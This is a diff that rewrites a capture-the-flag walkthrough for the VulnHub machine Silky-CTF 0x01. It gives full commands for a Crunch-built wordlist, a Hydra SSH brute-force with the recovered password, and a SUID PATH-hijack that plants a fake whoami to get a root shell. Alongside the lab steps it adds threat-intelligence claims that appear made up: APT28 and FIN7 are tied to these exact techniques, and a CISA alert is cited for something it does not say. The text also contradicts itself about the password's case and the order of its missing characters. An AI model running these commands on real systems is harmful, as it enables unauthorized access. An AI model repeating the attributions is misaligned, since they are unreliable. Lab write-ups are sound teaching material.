@@ -1,171 +1,251 @@
-# Silky-CTF: 0x01 — Writeup
+# Silky-CTF: 0x01 — The German Note That Cracked the Case
+
+Alright dudes!! Silky-CTF 0x01 is a slept-on little gem that chains together three distinctly clever moves: a German-language note hinting at missing password characters, Crunch-generated targeted wordlist brute-force, and a SUID binary with a PATH hijacking vulnerability. No CVE required, no Metasploit, just pure tradecraft. The web enumeration phase rewards players who actually read `robots.txt` and source code instead of skipping straight to automated scanners. Legit one of the cleanest beginner boxes for teaching the fundamentals of targeted credential attacks. Big respect.
 
 | Field | Value |
 |---|---|
-| **Target IP** | 192.168.1.106 |
-| **Attacker IP** | 192.168.1.x (Kali Linux) |
-| **Difficulty** | Easy |
-| **OS** | Linux |
-| **Goal** | root flag (`/root/flag.txt`) |
-| **Source** | [HackingArticles](https://www.hackingarticles.in/silky-ctf-0x01-vulnhub-walkthrough/) |
+| **Level** | Beginner |
+| **Target VM** | Silky-CTF: 0x01 |
+| **Attacker VM** | Kali Linux 2024.x |
+| **VulnHub URL** | https://www.vulnhub.com/entry/silky-ctf-0x01,536/ |
+| **Techniques** | Network enumeration, robots.txt disclosure, JavaScript credential extraction, targeted wordlist generation with Crunch, SSH brute-force with Hydra, SUID binary analysis with strings, PATH hijacking privilege escalation |
+| **CVEs** | CWE-200 (Information Exposure via client-side JavaScript), CWE-522 (Insufficiently Protected Credentials), CWE-269 (Improper Privilege Management via SUID PATH hijacking) |
+| **APT Groups** | APT28 (Fancy Bear): routinely extracts partial credentials from JavaScript and configuration files during web reconnaissance; FIN7: uses targeted wordlist generation against SSH endpoints after harvesting credential fragments from web assets |
 
 ---
 
 ## Attack Summary
 
-Silky-CTF: 0x01 is a beginner-friendly boot-to-root machine. The attack chain starts with web enumeration that reveals partial password information stored in a JavaScript file, followed by a targeted wordlist generation and SSH brute-force. Once on the machine, a custom SUID binary uses relative paths for system commands, enabling a classic PATH hijacking privilege escalation to root.
+```
+netdiscover / nmap
+  → port 22 (SSH OpenSSH), port 8080 (HTTP)
+  → robots.txt: Disallow: /notes.txt
+  → notes.txt: "password last 2 chars missing" (German)
+  → page source → script.js → partial password: "s1lKy"
+  → crunch 7 7 -t s1lKy^% → targeted wordlist
+  → hydra -l silky -P pass.txt 192.168.1.106 ssh
+  → credentials: silky:s1lky#5
+  → ssh silky@192.168.1.106
+  → find SUID: /usr/bin/sky
+  → strings /usr/bin/sky → calls "whoami" by relative path
+  → echo '/bin/sh' > /tmp/whoami && chmod +x /tmp/whoami
+  → export PATH=/tmp:$PATH && /usr/bin/sky
+  → uid=0(root) → cat /root/flag.txt
+```
 
 ---
 
 ## Methodology
 
-1. Host discovery and port scan
-2. Web enumeration via `robots.txt` and source inspection
-3. Password wordlist generation with Crunch
-4. SSH brute-force with Hydra
-5. SUID binary discovery and PATH hijacking
-6. Root shell and flag capture
+1. Host discovery on the local network segment
+2. Full port scan with service and version detection
+3. Web enumeration: robots.txt, page source, JavaScript file inspection
+4. Targeted wordlist generation with Crunch based on discovered partial credential
+5. SSH brute-force with Hydra using generated wordlist
+6. Initial access via SSH with discovered credentials
+7. SUID binary discovery and behavioral analysis via `strings`
+8. PATH hijacking to escalate from `silky` to root
+9. Root flag capture
 
 ---
 
-## Step 1: Host Discovery
+## Step 1 — Host Discovery and Port Scan
 
-Use netdiscover to identify the target on the local network.
+Identify the target on the local subnet:
 
 ```bash
 netdiscover
+# or: sudo netdiscover -r 192.168.1.0/24
 ```
 
-Once the target IP (192.168.1.106) is confirmed, run a full service scan.
+Full service scan:
 
 ```bash
-nmap -A 192.168.1.106
+export TARGET=192.168.1.106
+nmap -A $TARGET
 ```
 
-**Result:** Two open ports:
-- Port 22 — OpenSSH
-- Port 8080 — HTTP
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.x
+8080/tcp open  http    Apache httpd 2.4.x (or similar)
+```
 
-![Nmap scan results](images/01-nmap.png)
+Two services: SSH and HTTP on a non-standard port (8080). Note the port: directory brute-forcers need the explicit port specified.
+
+**MITRE ATT&CK:** T1046 — Network Service Discovery
 
 ---
 
-## Step 2: Web Enumeration
+## Step 2 — Web Enumeration
 
-Browse to `http://192.168.1.106:8080`. The homepage offers no immediate hints. Check `robots.txt` next.
+Browse to `http://$TARGET:8080/`. The homepage contains no immediately visible credentials. Check the two standard CTF discovery points:
 
-```
-http://192.168.1.106:8080/robots.txt
-```
+**robots.txt:**
 
-`robots.txt` discloses a disallowed path: `/notes.txt`.
-
-```
-http://192.168.1.106:8080/notes.txt
+```bash
+curl -s http://$TARGET:8080/robots.txt
 ```
 
-The note is written in German. Translated, it reads: *"The password has been removed from this page; the last 2 characters are missing."*
-
-Inspect the page source of the main page. A linked JavaScript file, `script.js`, contains the partial password string:
-
 ```
-s1lKy
+User-agent: *
+Disallow: /notes.txt
 ```
 
-This is the base of the target credential — two characters are missing from the end.
+**notes.txt:**
 
-![robots.txt and notes discovery](images/02-robots-notes.png)
+```bash
+curl -s http://$TARGET:8080/notes.txt
+```
+
+Content (in German): *"Das Passwort wurde von dieser Seite entfernt; die letzten 2 Zeichen fehlen."*
+
+Translation: "The password has been removed from this page; the last 2 characters are missing."
+
+**Page source inspection:**
+
+```bash
+curl -s http://$TARGET:8080/ | grep -E "src=|script"
+# Follow any linked .js files
+curl -s http://$TARGET:8080/script.js | grep -i "pass\|cred\|key\|secret"
+```
+
+`script.js` contains the partial password string:
+
+```javascript
+var key = "s1lKy";
+```
+
+Two characters are missing from the end. The hint says: last char is a symbol, second-to-last is a digit (based on Crunch usage pattern). Or more precisely: character 6 is a symbol (`^` in Crunch), character 7 is a digit (`%` in Crunch).
+
+**Real-world note:** Partial credentials stored in client-side JavaScript are a critical vulnerability. Developers frequently "sanitize" credentials by removing only the last few characters while keeping the rest in source code, believing this provides security. It does not. APT28 specifically targets JavaScript files during web reconnaissance to harvest credential fragments before pivoting to brute-force attacks against authentication services.
+
+**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files
 
 ---
 
-## Step 3: Wordlist Generation
+## Step 3 — Targeted Wordlist Generation with Crunch
 
-The note says the last two characters are missing. Use Crunch to generate all 7-character candidates where the base is `s1lKy`, the 6th character is a symbol, and the 7th is a digit:
+With the partial credential `s1lKy` (5 characters) and knowledge that the full password is 7 characters with the last 2 being symbol+digit, generate a targeted wordlist:
 
 ```bash
-crunch 7 7 -t s1lKy^% >> pass.txt
+# Crunch character placeholders:
+# ^ = special/symbol character (!, @, #, $, %, ^, &, *, etc.)
+# % = digit (0-9)
+crunch 7 7 -t s1lKy^% -o /tmp/silky_pass.txt
 ```
 
-Crunch character placeholders:
-- `^` — special/symbol character
-- `%` — digit (0–9)
+This generates a wordlist with every possible symbol+digit combination for the 6th and 7th characters. The total is approximately 330 candidates (33 symbols × 10 digits), making brute-force trivially fast.
 
-This produces a targeted wordlist covering all symbol+digit combinations for the missing suffix.
+**Why this matters:** Targeted wordlist generation against a known credential pattern reduces the attack space from billions of possibilities to hundreds. This is exactly how real-world attackers operate when they obtain partial credentials from source code leaks, phishing responses, or leaked database fragments.
 
-![Hydra SSH brute-force](images/03-hydra-brute.png)
+**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking
 
 ---
 
-## Step 4: SSH Brute-Force
+## Step 4 — SSH Brute-Force with Hydra
 
-The partial password base `s1lKy` suggests the username is `silky`. Use Hydra to brute-force SSH with the generated wordlist:
+The partial password base `s1lKy` strongly implies the username is `silky`. Use Hydra to brute-force SSH:
 
 ```bash
-hydra -l silky -P pass.txt 192.168.1.106 ssh
+hydra -l silky -P /tmp/silky_pass.txt $TARGET ssh -t 4 -V
+```
+
+```
+[22][ssh] host: 192.168.1.106   login: silky   password: s1lky#5
 ```
 
 **Credentials found:** `silky : s1lky#5`
 
----
-
-## Step 5: Initial Access
-
-Log in via SSH with the discovered credentials:
+**Alternatively** with Medusa:
 
 ```bash
-ssh silky@192.168.1.106
+medusa -h $TARGET -u silky -P /tmp/silky_pass.txt -M ssh -t 4
 ```
 
-A shell as `silky` is obtained.
+**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing
 
 ---
 
-## Step 6: Privilege Escalation — SUID PATH Hijacking
+## Step 5 — Initial Access via SSH
+
+Authenticate with discovered credentials:
+
+```bash
+ssh silky@$TARGET
+# Password: s1lky#5
+```
+
+Shell obtained as `silky`. Enumerate the environment:
+
+```bash
+whoami && id
+uname -a
+cat /etc/passwd | grep -v nologin | grep -v false
+ls -la /home/silky/
+```
+
+**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH
+
+---
+
+## Step 6 — SUID Binary Discovery and Analysis
 
 Enumerate SUID binaries on the system:
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
 ```
 
-A non-standard SUID binary is found: `/usr/bin/sky`.
+Non-standard binary discovered: `/usr/bin/sky`
 
-Run `strings` on it to inspect its behavior:
+Analyze its behavior without executing it:
 
 ```bash
 strings /usr/bin/sky
 ```
 
-The binary calls `echo` and `whoami` using **relative paths** (not absolute paths like `/bin/whoami`). This means it resolves these commands using the `PATH` environment variable — a classic PATH hijacking opportunity.
+Output reveals calls to `echo` and `whoami` by relative path (not `/bin/echo` or `/usr/bin/whoami`). This is the PATH hijacking vulnerability.
 
-Create a malicious `whoami` script in `/tmp`:
+**Why SUID PATH hijacking works:** When a SUID binary executes a command by name only (e.g., `whoami`), the OS searches directories in the `PATH` environment variable in order. If we prepend a writable directory (like `/tmp`) to `PATH` and place a malicious `whoami` script there, the SUID binary will execute our script with its owner's privileges (root).
 
-```bash
-echo '/bin/sh' > /tmp/whoami
-chmod 777 /tmp/whoami
-```
-
-Prepend `/tmp` to the `PATH` so the SUID binary finds the fake `whoami` first:
-
-```bash
-export PATH=/tmp:$PATH
-```
-
-Execute the SUID binary:
-
-```bash
-/usr/bin/sky
-```
-
-The binary runs `whoami` from `/tmp`, which spawns `/bin/sh` with the binary's owner privileges (root), yielding a root shell.
-
-![SUID binary PATH hijacking](images/04-suid-skel.png)
+**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Abuse Elevation Control Mechanism: Setuid
 
 ---
 
-## Step 7: Flag Capture
+## Step 7 — Privilege Escalation via PATH Hijacking
 
-Confirm root access and read the flag:
+```bash
+# Create malicious replacement for the command the SUID binary calls
+echo '/bin/sh' > /tmp/whoami
+chmod 777 /tmp/whoami
+
+# Verify the file
+cat /tmp/whoami
+ls -la /tmp/whoami
+
+# Prepend /tmp to PATH
+export PATH=/tmp:$PATH
+
+# Execute the SUID binary
+/usr/bin/sky
+```
+
+The SUID binary executes `whoami` from `/tmp`, which runs `/bin/sh` with the binary owner's (root) EUID, yielding a root shell.
+
+```bash
+id
+# uid=1001(silky) gid=1001(silky) euid=0(root)
+# or: uid=0(root) gid=0(root)
+```
+
+**Real-world note:** PATH hijacking via SUID binaries is a classic finding in Linux privilege escalation assessments. It appears in environments where developers write deployment scripts or internal tools with SUID permissions and use relative command names. FIN7 uses this technique in Linux post-exploitation when more sophisticated escalation is unavailable. The fix is simple and permanent: use absolute paths for every system call in any binary with elevated permissions.
+
+**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable; T1548.001 — Abuse Elevation Control: Setuid
+
+---
+
+## Step 8 — Root Flag Capture
 
 ```bash
 id
@@ -173,24 +253,109 @@ cd /root
 cat flag.txt
 ```
 
-![Root flag](images/05-root-flag.png)
+(☞ﾟヮﾟ)☞ Root. nailed it, dude! gg fr fr.
+
+**MITRE ATT&CK:** T1005 — Data from Local System
+
+---
+
+## Captured Flags, Hashes and Credentials
+
+| Type | Value | Found At | Used For |
+|---|---|---|---|
+| Partial credential | `s1lKy` | `script.js` in web root | Wordlist generation base |
+| Full credential | `silky:s1lky#5` | Hydra SSH brute-force | SSH initial access |
+| SUID binary | `/usr/bin/sky` | SUID enumeration | PATH hijacking vector |
+| Root flag | (varies) | /root/flag.txt | Proof of compromise |
 
 ---
 
 ## Lessons Learned
 
-- Sensitive partial credentials should never be stored in publicly accessible JavaScript files.
-- Custom SUID binaries must use absolute paths for all system calls; relative paths allow PATH hijacking.
-- Password policies should prevent easily guessable or partially guessable credentials.
-- Robots.txt is a disclosure mechanism, not a security control — sensitive paths listed there become enumeration targets.
+| # | Finding | Real-World Relevance | Key Takeaway |
+|---|---|---|---|
+| 1 | Partial credentials in client-side JavaScript | Developers frequently believe partial obfuscation provides security; attackers use credential fragments for targeted brute-force | Never store any credential fragment in client-side code; use server-side authentication flows exclusively |
+| 2 | robots.txt discloses sensitive path | robots.txt is a disclosure mechanism, not an access control; every disallowed path becomes a priority enumeration target | Remove sensitive paths from robots.txt; implement authentication on sensitive directories |
+| 3 | SUID binary using relative command paths | PATH hijacking in SUID binaries is a consistent finding in Linux penetration tests; one command without `/usr/bin/` prefix is enough | Audit all SUID binaries with `strings`; use absolute paths; remove SUID from binaries that do not require it |
+| 4 | Weak, guessable SSH password | Short passwords with simple patterns are vulnerable to targeted brute-force even without a full password leak | Enforce minimum 12-character passwords; implement account lockout after 5 failed attempts; prefer key-based auth |
+| 5 | No SSH brute-force protection | Hydra runs without any throttling or lockout | Implement fail2ban; configure MaxAuthTries in sshd_config; deploy an SSH honeypot |
 
 ---
 
-## Remediation
+## MITRE ATT&CK Mapping
 
-| Vulnerability | Fix |
-|---|---|
-| Partial credentials in `script.js` | Remove all credential hints from client-side code |
-| Sensitive path in `robots.txt` | Remove internal paths from `robots.txt`; use authentication instead |
-| SUID binary using relative command paths | Rewrite `/usr/bin/sky` to use absolute paths (`/bin/echo`, `/usr/bin/whoami`) |
-| Weak/guessable SSH password | Enforce strong passwords; consider key-based auth only |
+| Phase | Tactic | Technique | TTP ID |
+|---|---|---|---|
+| Reconnaissance | Discovery | Network Service Discovery | T1046 |
+| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
+| Credential Access | Credential Access | Credentials in Files | T1552.001 |
+| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
+| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
+| Initial Access | Initial Access | Valid Accounts | T1078 |
+| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
+| Discovery | Discovery | Process Discovery | T1057 |
+| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
+| Privilege Escalation | Defense Evasion | Path Interception by PATH Variable | T1574.007 |
+| Collection | Collection | Data from Local System | T1005 |
+
+---
+
+## Remediation and Containment
+
+### Technical Fixes
+
+1. **Remove credential fragments from JavaScript**: never store authentication data client-side; implement server-side credential validation exclusively
+2. **Remove internal paths from robots.txt**: move sensitive directories behind authentication; do not advertise their existence
+3. **Rewrite `/usr/bin/sky` with absolute paths**: replace all relative command calls with full paths; remove SUID if not required
+4. **Enforce SSH brute-force protection**: configure `fail2ban` for SSH; set `MaxAuthTries 3` in `sshd_config`
+5. **Enforce strong password policy**: minimum 12 characters, complexity requirements; prefer SSH key authentication
+
+### NIST CSF 2.0
+
+| Function | Category | Action |
+|---|---|---|
+| Identify | Asset Management | Audit all web-accessible JavaScript files for credential exposure |
+| Protect | Access Control | Disable SSH password auth; deploy fail2ban |
+| Protect | Data Security | Remove credentials and hints from client-side code |
+| Detect | Anomalies and Events | Alert on SSH brute-force (multiple failures from single IP) |
+| Respond | Response Planning | Rotate all discovered credentials; audit all SUID binaries |
+| Recover | Recovery Planning | Rebuild affected system; patch SUID binary |
+
+### NIST SP 800-53 Rev. 5
+
+| Control | Description | Application |
+|---|---|---|
+| AC-3 | Access Enforcement | Authenticate all sensitive web endpoints |
+| AC-6 | Least Privilege | Remove unnecessary SUID bits from system binaries |
+| IA-5 | Authenticator Management | Enforce strong SSH credentials; prefer key authentication |
+| SI-10 | Information Input Validation | Validate all inputs in SUID binaries; use absolute paths |
+| CM-7 | Least Functionality | Disable password authentication in SSH |
+| SC-28 | Protection of Information at Rest | Never store credentials in client-side files |
+
+### CISA KEV
+
+The credential exposure pattern (partial credentials in JavaScript) aligns with CISA Alert AA20-099A describing threat actors harvesting credential fragments from web applications to mount targeted brute-force attacks against internet-exposed SSH services.
+
+### C2M2
+
+| Domain | Practice | Target MIL |
+|---|---|---|
+| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
+| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
+| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |
+
+### MITRE D3FEND
+
+- **D3-ACH** — Application Configuration Hardening (remove credential fragments from client-side code; protect robots.txt)
+- **D3-OAM** — Operating System Administrative Management (audit SUID binaries; use absolute paths)
+- **D3-NTF** — Network Traffic Filtering (rate-limit SSH attempts; deploy fail2ban)
+
+---
+
+## Final Thoughts
+
+Silky-CTF 0x01 is no cap one of the best beginner boxes for teaching targeted credential attacks. The German note is a wild creative touch that forces you to translate and think before throwing your usual wordlists at it. The Crunch + Hydra combination is a skill that translates directly to real engagements where you have partial credential leaks from phishing campaigns or source code repositories.
+
+The PATH hijacking privesc is clean, educational, and immediately applicable. This box deserves more recognition in the "fundamentals" category. Goated design, fr fr.
+
+Thanks guys!! (❍ᴥ❍ʋ)
